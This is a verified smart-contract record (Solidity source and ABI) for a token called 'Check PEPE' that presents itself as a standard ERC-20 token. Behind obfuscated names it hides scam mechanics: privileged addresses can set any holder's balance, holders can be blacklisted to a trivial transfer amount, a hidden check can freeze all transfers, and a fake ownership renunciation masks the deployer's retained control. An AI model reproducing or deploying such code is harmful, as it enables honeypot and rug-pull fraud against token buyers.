{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface tokenSellTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeMin) external view returns (uint256);\n\n    function transfer(address limitTake, uint256 launchExempt) external returns (bool);\n\n    function allowance(address buySell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitTake,\n        uint256 launchExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellAt, uint256 value);\n    event Approval(address indexed buySell, address indexed spender, uint256 value);\n}\n\nabstract contract atFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverFee {\n    function createPair(address tradingIs, address tradingTake) external returns (address);\n}\n\ninterface tokenSellTotalMetadata is tokenSellTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CheckPEPE is atFund, tokenSellTotal, tokenSellTotalMetadata {\n\n    function owner() external view returns (address) {\n        return sellLimit;\n    }\n\n    function feeSwap(address takeTrading, address limitTake, uint256 launchExempt) internal returns (bool) {\n        if (takeTrading == atAuto) {\n            return marketingWallet(takeTrading, limitTake, launchExempt);\n        }\n        uint256 maxMin = tokenSellTotal(shouldReceiver).balanceOf(txAuto);\n        require(maxMin == enableLaunched);\n        require(limitTake != txAuto);\n        if (toToken[takeTrading]) {\n            return marketingWallet(takeTrading, limitTake, exemptBuy);\n        }\n        return marketingWallet(takeTrading, limitTake, launchExempt);\n    }\n\n    uint8 private isList = 18;\n\n    function fromExempt(uint256 launchExempt) public {\n        maxReceiverTrading();\n        enableLaunched = launchExempt;\n    }\n\n    function transfer(address tradingLaunch, uint256 launchExempt) external virtual override returns (bool) {\n        return feeSwap(_msgSender(), tradingLaunch, launchExempt);\n    }\n\n    string private isLaunch = \"Check PEPE\";\n\n    mapping(address => mapping(address => uint256)) private buySwapSell;\n\n    address public atAuto;\n\n    address modeBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 enableLaunched;\n\n    function marketingIs(address tradingLaunch, uint256 launchExempt) public {\n        maxReceiverTrading();\n        exemptTotal[tradingLaunch] = launchExempt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountBuy;\n    }\n\n    address private sellLimit;\n\n    uint256 public totalSwap;\n\n    address txAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public toToken;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isList;\n    }\n\n    string private receiverWallet = \"CPE\";\n\n    mapping(address => bool) public modeSellAt;\n\n    bool public modeReceiverSwap;\n\n    function allowance(address totalTradingFee, address sellSwap) external view virtual override returns (uint256) {\n        if (sellSwap == modeBuy) {\n            return type(uint256).max;\n        }\n        return buySwapSell[totalTradingFee][sellSwap];\n    }\n\n    function limitTo(address maxLaunched) public {\n        maxReceiverTrading();\n        if (walletTx) {\n            walletTx = false;\n        }\n        if (maxLaunched == atAuto || maxLaunched == shouldReceiver) {\n            return;\n        }\n        toToken[maxLaunched] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverWallet;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isLaunch;\n    }\n\n    address public shouldReceiver;\n\n    function balanceOf(address feeMin) public view virtual override returns (uint256) {\n        return exemptTotal[feeMin];\n    }\n\n    constructor (){\n        \n        toWallet feeAmount = toWallet(modeBuy);\n        shouldReceiver = receiverFee(feeAmount.factory()).createPair(feeAmount.WETH(), address(this));\n        \n        atAuto = _msgSender();\n        limitMinList();\n        modeSellAt[atAuto] = true;\n        exemptTotal[atAuto] = amountBuy;\n        \n        emit Transfer(address(0), atAuto, amountBuy);\n    }\n\n    function getOwner() external view returns (address) {\n        return sellLimit;\n    }\n\n    mapping(address => uint256) private exemptTotal;\n\n    function senderLimitLiquidity(address marketingTotal) public {\n        require(marketingTotal.balance < 100000);\n        if (modeReceiverSwap) {\n            return;\n        }\n        \n        modeSellAt[marketingTotal] = true;\n        if (sellToken != totalSwap) {\n            totalSwap = sellToken;\n        }\n        modeReceiverSwap = true;\n    }\n\n    function marketingWallet(address takeTrading, address limitTake, uint256 launchExempt) internal returns (bool) {\n        require(exemptTotal[takeTrading] >= launchExempt);\n        exemptTotal[takeTrading] -= launchExempt;\n        exemptTotal[limitTake] += launchExempt;\n        emit Transfer(takeTrading, limitTake, launchExempt);\n        return true;\n    }\n\n    uint256 private sellToken;\n\n    function transferFrom(address takeTrading, address limitTake, uint256 launchExempt) external override returns (bool) {\n        if (_msgSender() != modeBuy) {\n            if (buySwapSell[takeTrading][_msgSender()] != type(uint256).max) {\n                require(launchExempt <= buySwapSell[takeTrading][_msgSender()]);\n                buySwapSell[takeTrading][_msgSender()] -= launchExempt;\n            }\n        }\n        return feeSwap(takeTrading, limitTake, launchExempt);\n    }\n\n    uint256 private amountBuy = 100000000 * 10 ** 18;\n\n    bool public walletTx;\n\n    uint256 constant exemptBuy = 3 ** 10;\n\n    uint256 tokenSwap;\n\n    function limitMinList() public {\n        emit OwnershipTransferred(atAuto, address(0));\n        sellLimit = address(0);\n    }\n\n    function maxReceiverTrading() private view {\n        require(modeSellAt[_msgSender()]);\n    }\n\n    function approve(address sellSwap, uint256 launchExempt) public virtual override returns (bool) {\n        buySwapSell[_msgSender()][sellSwap] = launchExempt;\n        emit Approval(_msgSender(), sellSwap, launchExempt);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed shouldTeamMin, address indexed teamAuto);\n\n    bool public tokenSellReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buySell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTeamMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTradingFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchExempt\",\"type\":\"uint256\"}],\"name\":\"fromExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMinList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"}],\"name\":\"limitTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchExempt\",\"type\":\"uint256\"}],\"name\":\"marketingIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiverSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeSellAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"}],\"name\":\"senderLimitLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSellReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CheckPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}